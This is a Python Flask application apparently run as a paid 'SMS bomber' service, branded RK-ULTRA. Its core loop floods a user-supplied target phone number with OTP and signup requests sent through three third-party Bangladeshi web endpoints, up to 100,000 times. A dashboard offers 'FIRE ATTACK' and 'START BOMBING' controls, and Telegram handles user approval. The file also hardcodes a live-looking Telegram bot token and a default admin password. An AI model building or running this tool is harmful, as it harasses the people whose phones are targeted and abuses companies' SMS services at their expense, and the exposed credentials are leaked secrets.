import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_ULTRA_SaaS_FINAL_V11"

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
RENDER_URL = "https://rk-bomb.onrender.com" 
ADMIN_USERNAME = "admin"

# API ENDPOINTS (সকল ডাটা ফিরিয়ে আনা হয়েছে)
ILYN_URL = "https://api.ilyn.global/auth/signup"
SHOP_URL = "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber="
SIM_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
BOUNDARY = "----WebKitFormBoundaryRKSTAR12345"

# ---------- AUTOMATIC WAKEUP ----------
def auto_wakeup():
    while True:
        try:
            requests.get(RENDER_URL, timeout=10)
        except:
            pass
        time.sleep(600) # ১০ মিনিট পরপর পিং

# ---------- DATABASE ----------
def db_query(query, params=(), fetch=False):
    conn = sqlite3.connect('system.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(query, params)
    data = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return data

def init_db():
    db_query('''CREATE TABLE IF NOT EXISTS users 
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)''')
    db_query('''CREATE TABLE IF NOT EXISTS history 
                 (id INTEGER PRIMARY KEY, username TEXT, phone TEXT, success INTEGER, total INTEGER, status TEXT)''')
    try:
        db_query("INSERT INTO users (username, password, role, status) VALUES (?, ?, ?, ?)", 
                 (ADMIN_USERNAME, generate_password_hash("admin123"), "admin", "approved"))
    except: pass

init_db()

# ---------- BOMBING CORE LOGIC ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            db_query("INSERT INTO history (username, phone, success, total, status) VALUES (?,?,?,?,?)",
                     (username, phone, active_sessions[key]['success'], active_sessions[key]['total'], "completed"))
            del active_sessions[key]
            break
            
        if active_sessions[key]['status'] == 'running':
            # 1. ILYN API
            try:
                p_json = json.dumps({"code": "BD", "number": phone}, separators=(",", ":"))
                enc = MultipartEncoder(fields={"phone": p_json, "provider": "sms"}, boundary=BOUNDARY)
                r1 = requests.post(ILYN_URL, headers={"Content-Type": enc.content_type}, data=enc, timeout=5)
                if r1.status_code == 200: active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            if active_sessions[key]['total'] >= limit: continue

            # 2. SHOP API
            try:
                r2 = requests.get(SHOP_URL + phone, timeout=5)
                if r2.status_code == 200: active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            if active_sessions[key]['total'] >= limit: continue

            # 3. SIM API (Robi)
            try:
                r3 = requests.post(SIM_URL, json={"msisdn": phone}, timeout=5)
                if r3.status_code == 200: active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            
            time.sleep(1)
        else:
            time.sleep(2)

# ---------- TELEGRAM WEBHOOK ----------
@app.route('/tg_webhook', methods=['POST'])
def tg_webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        action, target = cb["data"].split('_')
        status = "approved" if action == "approve" else "banned"
        db_query("UPDATE users SET status = ? WHERE username = ?", (status, target))
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/editMessageText", 
                      json={"chat_id": MY_CHAT_ID, "message_id": cb["message"]["message_id"], 
                            "text": f"✅ RK-SYSTEM: User {target} is now {status.upper()}!"})
    return "OK"

# ---------- UI & ROUTES ----------
HTML_BASE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RK-ULTRA SaaS</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; }
        .nav { background: #111; padding: 15px; border-bottom: 1px solid #0f0; display: flex; justify-content: space-between; }
        .container { padding: 20px; max-width: 600px; margin: auto; }
        .card { background: #0a0a0a; border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 4px solid #0f0; }
        input, button { background: #000; border: 1px solid #0f0; color: #fff; padding: 12px; width: 100%; margin: 5px 0; border-radius: 5px; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
        .progress-bar { height: 10px; background: #222; border-radius: 5px; margin: 10px 0; overflow: hidden; }
        .fill { height: 100%; background: #0f0; transition: 0.3s; }
    </style>
</head>
<body>
    <div class="nav"><span>★ RK-ULTRA</span> <a href="/logout" style="color:red; text-decoration:none;">LOGOUT</a></div>
    <div class="container">
        {% block content %}{% endblock %}
    </div>
</body>
</html>
'''

@app.route('/')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(HTML_BASE + '''
    {% block content %}
    <div class="card">
        <h3>FIRE ATTACK</h3>
        <form action="/api/start">
            <input name="num" placeholder="Target Number" required>
            <input name="amt" type="number" placeholder="Amount (4-100K)" required>
            <button>START BOMBING</button>
        </form>
    </div>
    <div id="live"></div>
    <script>
        setInterval(() => {
            fetch('/api/my_sessions').then(r => r.json()).then(data => {
                let h = '';
                for(let k in data) {
                    let s = data[k];
                    let p = Math.round((s.total/s.limit)*100);
                    h += `<div class="card">
                        <b>📱 ${s.phone}</b> [${s.total}/${s.limit}]<br>
                        Success: ${s.success}
                        <div class="progress-bar"><div class="fill" style="width:${p}%"></div></div>
                        <button onclick="location.href='/api/stop?num=${s.phone}'" style="background:red;color:#fff;">STOP</button>
                    </div>`;
                }
                document.getElementById('live').innerHTML = h;
            });
        }, 2000);
    </script>
    {% endblock %}
    ''')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user, pwd = request.form['u'], request.form['p']
        res = db_query("SELECT password, status FROM users WHERE username = ?", (user,), fetch=True)
        if res and check_password_hash(res[0][0], pwd):
            if res[0][1] == 'approved':
                session['user'] = user
                return redirect(url_for('dashboard'))
            return "Account Pending or Banned!"
    return render_template_string(HTML_BASE.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h2>LOGIN</h2>
        <form method="POST">
            <input name="u" placeholder="Username" required>
            <input name="p" type="password" placeholder="Password" required>
            <button>LOGIN</button>
        </form>
        <p>New? <a href="/register" style="color:cyan;">Register</a></p>
    </div>
    '''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        user, pwd = request.form['u'], generate_password_hash(request.form['p'])
        try:
            db_query("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'user', 'pending')", (user, pwd))
            btn = {"inline_keyboard": [[{"text": "✅ Approve", "callback_data": f"approve_{user}"}, {"text": "🚫 Ban", "callback_data": f"ban_{user}"}]]}
            requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", json={"chat_id": MY_CHAT_ID, "text": f"🔔 New Registration: {user}", "reply_markup": btn})
            return "Registration Success! Wait for Approval."
        except: return "User exists!"
    return render_template_string(HTML_BASE.replace('{% block content %}{% endblock %}', '''
    <div class="card">
        <h2>REGISTER</h2>
        <form method="POST">
            <input name="u" placeholder="Username" required>
            <input name="p" type="password" placeholder="Password" required>
            <button>REGISTER</button>
        </form>
    </div>
    '''))

@app.route('/api/start')
def start_api():
    u, num, amt = session.get('user'), request.args.get('num'), int(request.args.get('amt', 0))
    if u and num and amt >= 4:
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'status': 'running', 'success': 0, 'total': 0, 'limit': amt}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/my_sessions')
def my_sessions():
    return jsonify({k:v for k,v in active_sessions.items() if k.startswith(session.get('user',''))})

@app.route('/api/stop')
def stop_api():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: del active_sessions[key]
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == "__main__":
    threading.Thread(target=auto_wakeup, daemon=True).start()
    requests.get(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/setWebhook?url={RENDER_URL}/tg_webhook")
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
